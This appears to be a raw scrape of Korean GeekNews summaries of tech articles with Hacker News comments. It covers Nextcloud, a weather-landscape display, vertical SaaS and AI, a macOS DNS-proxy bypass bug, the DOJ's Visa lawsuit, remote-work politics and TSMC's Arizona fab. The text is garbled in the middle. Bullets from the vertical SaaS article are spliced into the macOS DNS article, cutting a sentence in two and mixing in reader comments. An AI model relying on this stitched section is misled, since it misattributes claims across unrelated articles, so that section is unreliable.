     * 통제
          + 회사 전반의 데이터 및 커뮤니케이션을 보호, 통제 및 모니터링하며, 비즈니스 및 법적 요구 사항을 준수함
          + 데이터를 항상 소유한 서버에 유지하여 메타데이터조차 유출되지 않음
     * 커뮤니티
          + 잠금이나 유료 장벽 없이 번창하는 투명한 오픈 소스 커뮤니티 개발 모델에서 지속적인 개선을 즐길 수 있음
          + 필요할 때 엔터프라이즈 지원의 혜택을 누릴 수 있음

Nextcloud Hub 9

     * 최고의 생산성 제공
          + 몇 달마다 새로운 기능이 제공되는 빠른 개발 속도
          + 다양한 비디오를 통해 최신 기능을 확인할 수 있음

Nextcloud 이벤트

     * 오프라인 및 온라인 이벤트
          + 컨퍼런스, 무역 박람회, 웨비나 및 온라인 미팅에 참여 가능

규정 준수 키트

     * 감사 기능
     * 파일 접근 제어
     * HIPAA, GDPR 등 준수
          + 데이터 정책 시행, 암호화, 사용자 관리 및 감사 기능 제공

Nextcloud 비교

     * 다른 솔루션과 비교
          + Nextcloud가 오픈 소스 클라우드 파일 저장 및 협업 플랫폼 시장에서 리더인 이유를 확인할 수 있음

GN⁺의 정리

     * Nextcloud Hub 9는 파일 저장, 동기화, 협업을 위한 강력한 오픈 소스 플랫폼임
     * 공공 부문, 기업, 서비스 제공업체, 교육 등 다양한 산업에서 데이터 보호 및 효율성 향상을 위해 사용됨
     * Nextcloud는 생산성, 데이터 통제, 커뮤니티 지원 측면에서 뛰어난 기능을 제공함
     * 빠른 개발 속도로 새로운 기능이 자주 추가되며, 다양한 이벤트를 통해 사용자와 소통함
     * 유사한 기능을 제공하는 다른 오픈 소스 프로젝트로는 ownCloud, Seafile 등이 있음

        Hacker News 의견

     * Nextcloud는 모든 기능을 하려 하지만, 어느 것도 전문 앱보다 잘하지 못함
          + 내부 구조가 엉망임
          + 클라이언트의 실제 IP를 얻는 문제로 10페이지 토론이 있었음
          + 업그레이드가 매우 어려움
          + 설치 프로그램이 데이터베이스를 파괴한 경험이 있음
     * Google 계정 잠금에 대비해 Nextcloud를 사용하기 시작했음
          + 빠르고, 개인적이며, 주요 데스크탑 및 모바일 플랫폼에 성숙한 클라이언트가 있음
          + OnlyOffice와 함께 Google Docs Editors의 대체제로 충분함
          + 파일 저장은 위험을 감수하지 않기 위해 Hetzner Storage Share를 사용 중임
          + Nextcloud의 Simple Signup 프로그램을 통해 무료 플랜에 가입할 수 있음
     * CVE 기록이 신뢰하기 어려운 이유로 Nextcloud 사용을 망설임
          + 자체 인프라를 운영하는 것이 더 안전하다는 오해가 있음
          + AWS, GCP, Azure, iCloud의 보안 엔지니어들이 더 철저한 작업을 수행함
     * 정부 기관에 Nextcloud를 추천하려고 조사 중임
          + Microsoft 365 스택과 경쟁하거나 호환되는 것이 필요함
          + 커뮤니티와 오픈 소스 기반을 존경하지만, PHP 기반과 앱의 불균형이 문제임
          + AppApi가 혁신적이지만 방향이 이상함
          + 큰 조직에서 성공적으로 사용되지만, 많은 시간과 노력이 필요함
     * 몇 년간 Nextcloud를 사용 중임
          + Google Cloud의 대체제로 괜찮음
          + 최근 비즈니스 협업 기능에 집중하고 있음
          + 사진 라이브러리가 제한적임
          + Immich로 이전 중임
          + Android의 Nextcloud 노트 앱이 오랫동안 고장남
     * iPhone의 벤더 잠금으로 인해 Nextcloud와 같은 앱의 백그라운드 연결이 느려지거나 차단됨
          + 파일 동기화가 어려움
     * Nextcloud snap을 사용하면 기본 기능을 쉽게 사용할 수 있음
          + 파일 공유에 좋음
          + 핵심 기능에 집중하고 코드 복잡성을 줄이는 것이 더 나았을 것임
     * 여러 오픈 소스 프로젝트를 사용하는 것이 더 나음
          + 서로 호환될 수 있는 휴대용 사양을 발전시키는 것이 더 나은 시간 사용임
     * Mailinabox를 사용하면 NextCloud를 함께 사용할 수 있음
          + 메일 서버와 함께 캘린더, 연락처 등을 동기화함
     * Nextcloud 서버를 사랑함
          + 휴대폰 카메라 사진을 자동으로 서버에 동기화함
"
"https://news.hada.io/topic?id=16926","Relly - 지루한 스탠드업 미팅은 이제 그만","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Relly - 지루한 스탠드업 미팅은 이제 그만

   주요 특징
    1. [팀의 목표 달성을 위한 태스크 연결]
       동료의 작업을 기다리며, 매번 진행 상황을 확인하는 것은 너무 번거롭습니다. 의존성을 중심으로 작업을 나열해서 빠르게 다른 사람의 작업 상태를 확인할 수 있고, 전체 프로젝트의 병목 지점을 빠르게 확인할 수 있는 시각화 방식을 제공합니다.
    2. [깜빡하고 빠뜨리는 업무 없이 집중력을 최대로 발휘할 수 있도록.]
       가끔씩 지금 무슨 일을 해야할 지 혼란스러운 경우가 있습니다. 정확한 상황 공유가 되지 않아 때로는 팀의 목표와 다른 일을 하기도 합니다. Relly는 전체 프로젝트 상황을 추적하고 할 일 목록을 한 번에 제공하여 효율적인 업무 관리를 돕습니다.
    3. [이제 지루한 스탠드업 미팅은 그만 하셔도 됩니다.]
       한눈에 어떤 일이 일어나고 있는지 볼 수 있습니다. 직관적으로 동료의 진행 상황을 이해하세요.

   내 할일만 하는 끊어진 협업이 아닌, 도미노처럼 긴밀하게 연결된 협업 경험 - 렐리

   Show GN으로 옮겨야 될 것 같네요
"
"https://news.hada.io/topic?id=16863","풍경 이미지를 통한 날씨 예보 시각화","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          풍경 이미지를 통한 날씨 예보 시각화

     * 날씨를 풍경으로 시각화하기
     * 전통적인 기상 관측소는 센서 데이터를 숫자로 표시함
     * 이러한 대시보드를 탐색하는 것은 특정 매개변수를 효과적으로 찾고 해석하며 시각화하는 데 많은 노력이 필요함
     * 풍경 이미지를 보는 것은 자연스럽고, 스트레스를 줄이며 최소한의 노력으로 편안한 시각적 경험을 제공함
     * 아래 방법은 숫자 데이터에 의존하지 않고 풍경 이미지 내에 날씨 정보를 인코딩하는 방법을 설명함
     * 인코딩 원칙
     * 풍경은 숲 속의 작은 집을 묘사함
     * 이미지의 수평 축은 현재 순간에서 시작하여 다음 날의 조건까지 확장되는 24시간 타임라인을 나타냄
     * 수직 축을 따라 분포된 다양한 풍경 요소는 날씨 이벤트와 조건을 상징함
     * 현재로부터 멀리 떨어진 이벤트일수록 이미지의 오른쪽에 위치함
     * 다음 정보가 풍경 이미지 내에 인코딩될 수 있음:
          + 타임라인 탐색을 단순화하는 시간 표시:
               o 일출 및 일몰 시간
               o 정오 및 자정
          + 날씨 예보 정보:
               o 바람 방향 및 강도
               o 온도 변동
               o 최고 및 최저 온도 값
               o 구름 덮개
               o 강수량
          + 현재 날씨 조건:
               o 온도
               o 기압
          + 비날씨 이벤트:
               o 생일
               o 공휴일
     * 구현
     * 이미지 생성 코드는 Python의 Pillow 라이브러리를 사용하여 작성되었으며 OpenWeather의 데이터를 기반으로 함
     * 이미지는 296x128 E-Ink 디스플레이에서 사용하도록 설계됨
     * 코드는 Python 3.9에서 테스트됨
     * 이벤트 이미지 | 설명
          + | 일출
          + | 일몰
          + | 구름 덮개
          + | 현재 시간 위치
          + | 자정
          + | 정오
          + | 남풍
          + | 동풍
          + | 서풍
          + | 북풍
          + | 비
     * 예시
     * 풍경 이미지 | 설명
          + | 정오쯤이며, 맑은 하늘과 약간의 구름이 예상됨. 밤새 북풍이 불 것으로 예상됨. 현재 온도가 상승 중이며, 일몰 후 하락하여 일출 전 최저점에 도달할 것임. 이 기간 동안 바람은 북동쪽으로 바뀔 것임
          + | 해가 뜨고 있으며, 뜨거운 맑은 날씨와 가벼운 남동풍이 불 것임. 일몰 후에도 온도가 높게 유지되며, 바람은 동쪽으로 바뀌어 저녁 내내 강해질 것임
          + | 하루 종일 추운 비가 내릴 것임. 남풍은 밤새 북동쪽으로 바뀔 것임
     * 코드 실행
     * 환경 준비
          + Linux
               o ./makevenv.sh
               o source .venv/bin/activate
          + Windows
               o makevenv.bat
               o .venv/Scripts/Activate
     * 이미지 생성 테스트
          + weather_landscape.py 파일에서 OWM_KEY 변수를 OpenWeather API 키로 업데이트
          + python run_test.py
     * 서버 실행
          + python run_server.py
     * 하드웨어
     * 하드웨어 설정에는 ESP32 개발 보드와 2.9인치 E-Ink 디스플레이 모듈이 포함됨
     * 현재 설정은 인터넷에서 소스를 가져와 15분마다 이미지를 업데이트함
     * 이미지 생성 코드를 ESP32에서 MicroPython으로 사용할 수 있을지는 불확실함
     * GN⁺의 정리
     * 이 기사는 날씨 정보를 시각적으로 더 쉽게 이해할 수 있도록 풍경 이미지로 인코딩하는 방법을 설명함
     * 풍경 이미지를 통해 날씨 정보를 전달함으로써 사용자는 스트레스를 덜 받고 더 직관적으로 정보를 이해할 수 있음
     * Python과 Pillow 라이브러리를 사용하여 이미지를 생성하며, OpenWeather API를 통해 데이터를 가져옴
     * ESP32 개발 보드와 E-Ink 디스플레이를 사용하여 하드웨어 구현 가능성도 탐구함
     * 비슷한 기능을 가진 프로젝트로는 WeatherFlow, Netatmo Weather Station 등이 있음

        Hacker News 의견

     * 작은 조정으로 이 프로젝트를 실제로 사용할 수 있을 것 같음
          + 나무의 굽힘으로 바람 방향을 나타내기
          + 일출과 일몰을 지평선 위의 태양으로 표시하기
          + 밤하늘과 낮하늘을 다르게 음영 처리하기
          + 현재 시간을 기준으로 시작하지 않고 고정된 시점에서 시작하기
     * 몇 년 전 날씨에 따라 예술 작품을 선택하는 프로젝트를 시도했음
          + 수동 필터를 사용하여 태그된 이미지를 확인할 수 있음
          + 정확한 날씨 보고보다는 분위기를 위한 데스크탑 배경으로 사용하려 했음
          + 이미지 태그는 주로 수동으로 작업했음
     * 이 프로젝트가 매우 재미있음
          + 집 근처 녹지의 정기적인 사진을 찍고, 구름 덮개 데이터와 날짜를 기록하여 현재 예보와 가장 유사한 이미지를 배경으로 표시하기
     * 오래된 사진 프레임을 OpenAI의 DALL-E 이미지 생성기에 연결했음
          + 현재 날씨 데이터를 기반으로 이미지를 생성하고 몇 시간마다 업데이트됨
     * Yr.no 앱의 주요 화면을 떠올리게 함
          + 날씨를 창 밖의 모습으로 시각화함
          + 하루 중 한 순간만 볼 수 있어 수평으로 스크롤해야 함
          + 온도는 숫자로만 표시됨
     * 비슷한 개념을 안드로이드 배경화면으로 사용 중임
          + 유용한 정보를 전달하는 예술 작품 아이디어를 좋아함
     * UX 측면에서 windy.com이 최고의 날씨 보고 경험을 제공함
          + 구름/비의 이동 방향을 알 수 있어 유용함
          + 다른 경쟁자가 더 많아졌으면 좋겠음
     * 이 아이디어가 매우 멋짐
     * Tad Williams의 Otherland 시리즈를 떠올리게 함
     * 흥미로운 아이디어지만 이미지 의미가 이상하게 잘못된 부분이 있음
          + 밤에 하늘이 밝지 않아야 하고, 일출 시 태양이 높이 떠 있지 않아야 함
          + 직관적인 아이콘으로 일출과 일몰을 표시하는 것이 좋음
          + Windy.com의 타임라인 뷰가 여러 날씨 정보를 잘 압축하여 표시함
"
"https://news.hada.io/topic?id=16894","Vertical SaaS의 진화: 이제 AI를 내장하다","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     Vertical SaaS의 진화: 이제 AI를 내장하다

"https://news.hada.io/topic?id=16820","macOS Sequoia 15의 DNS 암호화 우회 가능성","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    macOS Sequoia 15의 DNS 암호화 우회 가능성

경고: macOS Sequoia 15가 DNS 암호화를 우회할 수 있음

  DNS 암호화 101

     * 웹 브라우저에 호스트 이름(예: apple.com)을 입력하면, 해당 이름은 IP 주소로 변환되어야 컴퓨터가 서버에 연결할 수 있음
     * 이 조회는 보통 암호화되지 않은 상태로 수행되며, 인터넷 제공자 및 연결을 모니터링하는 다른 당사자가 방문하는 사이트를 볼 수 있음
     * 이러한 조회를 보호하기 위해 Little Snitch 6는 새로운 기능인 DNS 암호화를 제공함
     * DNS 암호화가 활성화되면 모든 이름 조회가 Little Snitch를 통해 암호화된 형태로 수행됨
     * 이를 위해 Little Snitch는 DNS 프록시를 등록하며, macOS는 모든 DNS 요청을 해당 프록시로 보내어 암호화된 형태로 조회를 수행함

  하지만…

     * macOS 15 Sequoia에서 DNS 관련 문제를 조사하는 동안, 일부 DNS 요청(특히 특정 저수준 레거시 API를 통해 이루어진 요청)이 프록시로 전달되지 않는 것을 발견함
     * macOS Sequoia에 버그가 있어 일부 요청이 설치된 DNS 프록시를 우회하고 시스템의 기본 이름 서버로 암호화되지 않은 상태로 전송되는 것으로 보임
     * 이 버그는 Little Snitch뿐만 아니라 모든 종류의 DNS 프록시에 영향을 미칠 가능성이 있음
     * 따라서 Little Snitch 6의 새로운 DNS 암호화 기능을 사용하거나 다른 서드파티 DNS 프록시를 사용하는 경우, Apple이 향후 macOS 업데이트에서 수정할 때까지 일부 DNS 조회가 프록시를 우회할 수 있음을 인지해야 함
     * 참고로, 상위 수준 API를 통해 수행되는 DNS 조회는 이 버그의 영향을 받지 않음. 예를 들어, Safari나 Chrome에서의 웹 브라우징은 여전히 암호화된 조회의 혜택을 받음. 반면, Firefox는 영향을 받을 수 있음

  재현 방법

    1. Little Snitch 설정에서 DNS 암호화를 활성화함
    2. Wireshark를 port 53 캡처 필터로 시작함
    3. Xcode 플레이그라운드에서 다음 코드를 실행함:
import Foundation
let domain = ""dnsproxytest.com""
var result: UnsafeMutablePointer<addrinfo>?
let status = getaddrinfo(domain, nil, nil, &result)

     * dnsproxytest.com에 대한 조회가 Wireshark에서 암호화되지 않은 형태로 UDP 포트 53(암호화되지 않은 조회의 기본값)에서 보이는 것을 확인할 수 있음
     * 또한, Little Snitch 네트워크 모니터가 조회에 대한 트래픽을 전혀 표시하지 않음. 이는 조회가 네트워크 필터를 완전히 우회했기 때문임
     * 이 버그를 Apple에 보고했으며, 빠른 수정이 있기를 바람. 계속해서 업데이트를 제공할 예정임

  업데이트 2024-09-17, 오후 7:10

     * 추가 조사 결과, 이 버그는 최소한 macOS 14.5 Sonoma부터 존재했으며, 더 이전 버전에서도 존재할 가능성이 있음. 현재 더 오래된 14.x 시스템에 접근할 수 없어 테스트는 불가능함

GN⁺의 정리

     * 이 기사는 macOS Sequoia 15에서 DNS 암호화가 우회될 수 있는 버그를 다루고 있음
     * DNS 암호화는 인터넷 사용자의 프라이버시를 보호하는 중요한 기능임
     * 이 버그는 특히 저수준 레거시 API를 통해 이루어진 DNS 요청에 영향을 미침
     * Apple이 이 문제를 해결할      * 2020년에 SaaS가 핀테크를 추가하면 고객당 매출을 2~5배까지 늘리고 새로운 SaaS 시장을 개척할 수 있다고 얘기한 바 있음
     * 4년이 지난 지금, 버티컬 SaaS(VSaaS)가 다시 한번 스케일되고 있는데, 이번에는 ""AI""임
때까지 사용자는 일부 DNS 조회가 암호화되지 않을 수 있음을 인지해야 함

Vertical SaaS의 진화
     * 유사한 기능을 제공하는 다른 프로젝트로는 Pi-hole과 같은 DNS 필터링 솔루션이 있음


   중요한 정보 감사합니다.
     * 버티컬 소프트웨어 시장은 특정 산업을 가장 잘 지원하는 버티컬 SaaS 비즈니스가 지배적인 버티컬 솔루션이 되는 승자독식 역학을 가짐
   일단 사파리, 크롬은 안심할 수 있다고 하니 다행입니다.
     * 첫 번째 물결인 클라우드는 서비스를 온라인으로 제공함 (예: 전자상거래를 위한 Shopify, 서비스 노동자를 위한 ServiceTitan)
"
     * 두 번째 물결인 클라우드+핀테크는 VSaaS 기업이 소프트웨어 제품 내에 금융 서비스를 내장할 수 있게 해 수익을 증가시킴
     * 지금은 클라우드 + 핀테크 + AI 로 이루어진 버티컬 SaaS의 세 번째 물결의 시작을 목격하고 있음
          + 이 세번째 물결에서 가장 영향력 있는 것은 현재, ""노동을 소프트웨어로 전환""하여 VSaaS의 영역을 더욱 확장함

AI가 VSaaS 고객당 수익을 증가시킴

     * 피트니스 및 뷰티 스튜디오를 위한 수직 소프트웨어 기업 Mindbody 사례:
          + 1차 물결(클라우드)에서는 온라인 예약과 일정 관리 처리
          + 2차 물결(클라우드+핀테크)에서는 직원 급여, 고객 결제 처리, 스튜디오 보험 제공으로 사업 확장
          + 그러나 Mindbody 구독 피트니스 스튜디오 운영자는 여전히 마케팅, 영업, 고객 서비스, 재무 등 많은 업무를 수행하기 위해 인력이 필요함
     * 3차 물결인 AI의 등장:
          + 일부 역할에서는 항상 인간의 연결을 갈망하겠지만, 인간 연결이 핵심 이점이 아니고 핵심 제품을 제공하거나 비즈니스를 차별화하는 데 특별히 중요하지 않은 역할은 AI에 의해 보완되거나 완전히 대체될 수 있는 후보임
     * 적절한 솔루션으로 VSaaS를 사용하는 많은 기업은 영업, 마케팅, 고객 서비스, 운영, 재무 등에 대한 내부 및 외부 인건비를 크게 줄일 수 있음
     * 이는 VSaaS 기업의 수수료를 추가로 2~10배 더 증가시킬 수 있음
     * Mindbody를 넘어 미래의 버티컬 SaaS 플랫폼은 비즈니스 운영 전반에 걸쳐 인력과 기타 도구를 완전히 제거할 수 있을 것으로 예상됨

앞으로의 전망

     * AI는 버티컬 SaaS의 새로운 시대의 문을 열고 있음
     * 마케팅, 영업, 고객 서비스, 재무 등의 기능에서 AI는 현재 사람이 수행하는 많은 단순 작업을 보완, 자동화하거나 경우에 따라 대체할 것임
     * 이를 통해 VSaaS 기업은 소프트웨어로 더 많은 것을 제공할 수 있게 됨
     * 고객당 수익을 2~10배 증가시킬 뿐만 아니라 이전에는 시장 규모가 너무 작거나 고객 확보 비용이 효율적이지 않아 접근하기 어려웠던 시장의 기회도 열릴 것임
"
"https://news.hada.io/topic?id=16918","미 법무부, Visa의 독점으로 '거의 모든 것'의 가격에 영향 미친다고 비난","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              미 법무부, Visa의 독점으로 '거의 모든 것'의 가격에 영향 미친다고 비난

     * 미국 법무부는 세계 최대 결제 네트워크인 Visa를 상대로 직불 결제에 대한 불법 독점을 유지했다고 주장하며 소송을 제기함
     * 법무부는 Visa가 파트너들에게 ""배제적"" 계약을 강요하고 신생 기업들을 억압했다고 주장함
     * Visa와 소규모 경쟁사인 Mastercard는 지난 20년 동안 급성장하여 약 1조 달러의 시장 가치를 기록함

주요 내용

     * 법무부는 Visa가 경쟁 시장에서 부과할 수 있는 수수료를 초과하는 금액을 부과할 수 있는 권력을 불법적으로 축적했다고 주장함
     * Visa의 불법 행위로 인해 소비자와 상인들이 추가 비용을 지불하게 되었음
     * Visa는 법무부의 소송을 ""근거 없다""고 반박함

Visa의 반응

     * Visa의 법률 고문 Julie Rottenberg는 Visa가 직불 결제 시장에서 많은 경쟁자 중 하나일 뿐이라고 주장함
     * Visa는 자사가 구축한 결제 네트워크와 혁신, 경제적 기회를 자랑스럽게 여긴다고 언급함

법무부의 주장

     * 미국 내 직불 거래의 60% 이상이 Visa를 통해 이루어지며, Visa는 연간 70억 달러 이상의 처리 수수료를 부과함
     * Visa는 경쟁사로 거래를 전환하는 고객에게 벌칙 요금을 부과하여 경쟁을 억제함
     * Visa는 경쟁을 차단하고 혁신을 억제하기 위해 경쟁사에게 수억 달러를 지불함

경쟁사와의 협력

     * Visa는 Apple, PayPal, Square와 같은 기술 기업과 협력하여 잠재적 경쟁자를 파트너로 전환함
     * Visa는 Cash App의 전신과 계약을 체결하여 해당 회사가 Visa의 직불 네트워크에 큰 위협이 되지 않도록 함

법무부의 요청

     * 법무부는 법원이 Visa의 반경쟁적 관행을 금지하도록 요청함
     * 이는 바이든 행정부의 마지막 몇 달 동안 이루어진 조치로, 규제 기관들이 중개인에 대한 소송을 제기하고 불필요한 수수료에 맞서 싸우고 있음

GN⁺의 정리

     * 이 기사는 Visa가 직불 결제 시장에서 불법 독점을 유지하고 있다는 법무부의 소송에 대해 다루고 있음
     * Visa의 행위가 소비자와 상인들에게 추가 비용을 초래하고 경쟁을 억제한다는 점에서 중요한 이슈임
     * 이 기사는 결제 네트워크의 독점 문제와 관련된 법적, 경제적 논쟁을 이해하는 데 도움이 됨

        Hacker News 의견

     * Visa와 Mastercard가 지난 20년 동안 급성장하여 약 1조 달러의 시장 가치를 달성했음
          + 미국에서는 이제 FedNow라는 신용카드 결제의 저렴한 대안이 존재함
          + FedNow는 중간에 신용카드 회사가 개입하지 않는 즉시 은행 송금 시스템임
          + 신용카드의 차지백 기능 때문에 신뢰할 수 없는 온라인 상점에서는 여전히 신용카드가 더 나을 수 있음
          + 인도와 다른 여러 나라에서 이미 성공적으로 운영 중인 시스템임
     * Visa의 직불카드 수수료는 약 $0.21 + 0.05%임
          + 현금 취급 비용과 비교해보면 현금이 더 비쌈
          + IHL Group의 연구에 따르면 현금 취급 비용은 매출의 4.7%에서 15.3%에 달함
          + 현금 취급은 많은 위험과 부담을 수반함
          + 현금을 관리하기 위해 매일 밤 서랍을 세고, 직원들이 정직하게 행동할 것을 기대하며, 현금을 포장해 은행으로 운반해야 함
          + 현금 처리 및 취급 수수료를 지불해야 하며, 직원과 현금, 사업체가 회복 불가능한 책임에 노출될 위험이 있음
     * 미국 결제 시장은 남용적인 관행으로 가득 차 있음
          + Visa와 Mastercard 외에도 부유층에게 더 저렴한 차지백 카드가 있음
          + 상인들은 ""기프트 카드""라는 비대체성 화폐를 만들어 이익을 얻음
          + 상인 계좌가 갑자기 폐쇄되는 사례도 있음
     * 정부가 경제의 주요 인프라를 구축하는 것을 금지하고, 암호화폐가 유일한 대안임
     * Visa가 무너진다면 여러 새로운 경쟁자들이 등장할 것이라는 우려가 있음
     * 모든 단말기는 자체 네트워크에서 합법적인 카드를 실행해야 함
     * 기사에서 중요한 부분이 빠져 있다고 느껴짐
          + DOJ가 Visa의 특정 조치를 문제 삼고 있음
     * 신용카드 프로세서가 온라인 비즈니스에 부당한 영향을 미침
          + 작은 비즈니스는 신용카드 프로세서의 압력에 저항하기 어려움
     * Visa나 Mastercard 외에 사용할 수 있는 대안이 제한적임
          + Square, AMEX, Paypal 등의 수수료가 더 높음
     * 독점이 장기적으로 경제에 미치는 피해를 잊기 쉬움
          + 새로운 오픈 소스 결제 시스템이 진정한 경쟁을 촉진할 수 있는 좋은 시기임
"
"https://news.hada.io/topic?id=16921","엘리트의 원격 근무 전쟁은 생산성과 관련이 없다","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       엘리트의 원격 근무 전쟁은 생산성과 관련이 없다

     * 매년 CEO들은 더 많은 직원들이 사무실로 돌아오기를 요구함
     * 주류 뉴스 매체들은 원격 근무자들을 게으르다고 비난함
     * 이는 생산성과 관련이 없으며, David Graeber의 책은 이미 사무실 생산성의 신화를 폭로함

부동산 문제

     * 원격 근무에 대한 비난은 실제로 부동산 문제와 관련이 있음
     * 기업 임대주들은 전국적으로 1.2조 달러의 사무실 타워 대출을 보유하고 있음
     * 팬데믹 동안 연방 준비 제도의 ""거의 무료 돈""을 이용해 고급 사무실 건물을 매입함
     * 원격 근무가 확산되면서 이 공간을 임대할 수 없게 됨
     * 일부는 빈 건물을 아파트나 레스토랑으로 전환하려 하지만, 이는 비용이 많이 듦

경제적 영향

     * 사무실 공간의 12%에서 20%가 비어 있음
     * 2008년 금융 위기보다 더 심각함
     * 임대주들이 대출을 상환하지 못하면 파산할 가능성이 높음
     * 이는 은행들이 팔 수 없는 거대한 사무실 타워를 떠안게 됨
     * 2026년까지 1조 달러의 대출이 만기 도래 예정
     * 이는 금융 위기로 이어질 수 있음

연방 준비 제도의 역할

     * 연방 준비 제도의 인플레이션 억제 전쟁이 상황을 악화시킴
     * 금리 인상으로 인해 더 많은 기업들이 사무실 임대를 포기하게 됨
     * 상업용 부동산이 경제를 다시 침체시킬 가능성이 있음

도시와 상업 부동산

     * 주요 도시는 상업 임대주들에게 의존하고 있음
     * 사무실 건물의 가치가 급락하면서 도시의 재정에 큰 타격을 줌
     * 뉴욕은 사무실 부동산에서만 4530억 달러를 잃음
     * 미국 전역에서 사무실 건물의 가치는 40%에서 80%까지 하락함

CEO와 기업의 입장

     * CEO들은 은행과 상업 임대주들이 파산하는 것을 원하지 않음
     * 상업 부동산이 붕괴하면 주식 시장에도 악영향을 미침
     * 많은 CEO와 이사회 멤버들이 상업 부동산에 투자하고 있음
     * 상업 부동산이 붕괴하면 모두가 손해를 봄

결론

     * 엘리트들은 자신들의 재산을 보호하기 위해 우리에게 희생을 요구함
     * 그들은 우리의 생산성, 창의성, 건강에 관심이 없음
     * 오직 사무실 건물을 채우기 위해 우리를 사무실로 돌아오게 하려 함

GN⁺의 정리

     * 이 기사는 원격 근무에 대한 비난이 실제로는 상업 부동산 문제와 관련이 있음을 설명함
     * 상업 부동산의 붕괴가 경제에 미칠 영향을 경고함
     * 원격 근무가 생산성에 미치는 긍정적인 영향을 강조함

   지금 정도의 수준으로는 어림도 없겠지만 원격 근무가 널리 퍼지면 부동산 가격에 영향이 있을 수 있죠...

   이 주장은 뭔가 이상하네요 ㅡ.ㅡ; 설마 부동산 가격때문에 그럴리가요.

        Hacker News 의견

     * Amazon의 5일 출근 요구는 부동산 가격 상승을 위한 것이 아니라 직원 이탈을 유도하기 위한 도구일 가능성이 있음
          + 뉴욕 같은 도시에서는 상업용 부동산이 시 정부와 밀접한 관계를 맺고 있음
          + 그러나 부동산이 아마존 같은 대기업의 출근 정책을 좌우할 만큼 강력하지 않음
     * 부동산 포트폴리오를 가진 ""엘리트""들이 원격 근무를 비판하는 이야기를 만들고 있다는 주장은 비현실적임
          + 일부 사람들은 부동산에 잘못된 투자를 했고, 다른 사람들은 게으른 직원을 비난하는 기사를 쓰고 있음
          + 또 다른 기업 리더들은 직원들이 사무실 밖에서 일을 게을리할까봐 두려워함
     * Jeff Bezos가 부동산 포트폴리오를 구하기 위해 노력하는 것은 사실이 아님
          + 원격 근무는 초보자에게 어려움을 줄 수 있으며, 협력적이지 않은 선임 동료와의 소통이 스트레스를 줄 수 있음
          + 원격 근무는 엄격한 관리가 없으면 일부 직원들이 두 가지 일을 동시에 하는 것을 허용할 수 있음
     * 전 세계적으로 부동산 소유주들이 사람들을 사무실로 복귀시키려는 음모론은 신뢰할 수 없음
          + 코로나는 예외적인 사건이었으며, 그 결과는 시간이 지나면서 평균으로 돌아올 것임
     * 코로나 초기에는 재택근무가 생산성에 영향을 미치지 않는다고 했음
          + 이제는 생산성이 떨어졌다고 주장하며, 사무실 복귀를 요구하고 있음
          + 최근에는 사무실 복귀를 거부하는 직원들에게 낮은 급여나 해고를 위협하고 있음
     * ""원격 근무가 생산성을 떨어뜨린다""는 주장은 시대에 뒤떨어짐
          + 연구와 실제 사례는 많은 사람들이 집에서 더 생산적임을 보여줌
          + 원격 근무는 회사의 문화와 가치, 리더십, 소통에 기반을 둠
          + 성공적인 회사는 직원들을 신뢰하고, 명확한 기대치를 설정하며, 결과에 따라 책임을 묻음
          + 원격 근무 옵션을 제한하는 것은 회사에 불리함
     * 사무실 복귀 명령의 이유는 중요하지 않음
          + 사무실로 돌아가지 않을 것이며, 동료들과 함께 우리의 이익을 보호하기 위해 조직할 것임
          + 파업에서 보자고 함
     * 사무실 부동산에 투자한 사람들과 그 사무실을 사용하는 기업을 운영하는 사람들은 다름
          + 대부분의 기업은 부동산이 유지되는지 여부에 관심이 없음
          + 사무실 사용률을 높이는 것이 기업에 어떻게 도움이 되는지 이해할 수 없음
     * 많은 회사들이 직원들을 사무실로 복귀시키려 하지만, 충분한 사무실 공간을 제공하지 않음
          + 팀의 ""황금 경로"" 일정조차 고정된 책상이 없음
          + 회사는 사무실 복귀를 요구하면서도 실제로는 충분한 좌석을 제공하지 않음
     * 조용한 작업 공간이 필요한 사람들에게 원격 근무가 특히 유리함
          + 많은 사람들이 사무실에서 일하는 것을 선호하지만, 이는 다른 사람들의 집중을 방해할 수 있음
"
"https://news.hada.io/topic?id=16830","애플 모바일 프로세서는 이제 TSMC가 미국에서 생산합니다","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    애플 모바일 프로세서는 이제 TSMC가 미국에서 생산합니다

     * TSMC 애리조나 팹에서 Apple의 A16 SoC 생산이 시작되었음
          + A16은 2년 전 iPhone 14 Pro에 처음 탑재되었던 칩임
          + 현재는 소량 생산 중이지만, 2025년 상반기 목표 달성을 위해 단계적으로 생산량을 늘려갈 예정임
     * TSMC 애리조나 팹에서 생산되는 A16 칩은 대만에서 생산되는 것과 동일한 N4P 공정으로 제조됨
          + N4P 공정은 5nm 공정 계열에 속하지만 때로는 4nm로도 불림
     * 애리조나 프로젝트는 CHIPS Act에 따른 390억 달러 규모의 CHIPS for America Fund의 대표적인 프로젝트임

TSMC 애리조나 팹의 진척 상황

     * TSMC 대변인에 따르면 애리조나 프로젝트는 계획대로 순조롭게 진행되고 있음
     * 애리조나 공장의 수율은 현재 대만에 조금 뒤쳐져 있지만, 몇 달 내로 대만과 동등한 수준에 이를 것으로 예상됨

애리조나에서 생산된 A16 칩의 탑재 예상 제품

     * 정확한 탑재 제품은 알 수 없으나 다음과 같은 가능성이 있음:
          + 10월 경 출시 예정인 신형 iPad (iPad Mini는 제외)
          + 내년 출시 예정인 차기 iPhone SE (iPhone 14 기반으로 A16 칩 탑재 예상)

GN⁺의 의견

     * 세계 최대 파운드리인 TSMC가 미국에 첨단 공장을 세운 것은 반도체 산업에서 상당한 의미가 있는 사건임
          + 미중 무역 분쟁 등 지정학적 리스크를 피하기 위한 전략으로 보임
          + 미국 정부의 지원을 받아 미국 내 반도체 생태계 구축에도 기여할 것임
     * 다만 TSMC 입장에서는 대만에 비해 인건비, 전력비 등 생산 비용이 높아질 수 밖에 없음
          + 애리조나산 칩의 가격이 대만산에 비해 높아질 가능성이 있음
          + 장기적으로는 대만 공장의 경쟁력 약화로 이어질 수 있음
     * 애플로서는 TSMC 애리조나 팹을 통해 아이폰, 아이패드 등 주력 제품의 공급망 리스크를 낮출 수 있게 됨
          + 중국발 리스크 등으로부터 자유로워질 수 있음
          + 다만 칩 조달 비용 상승으로 인해 제품 가격이 오를 가능성도 있음
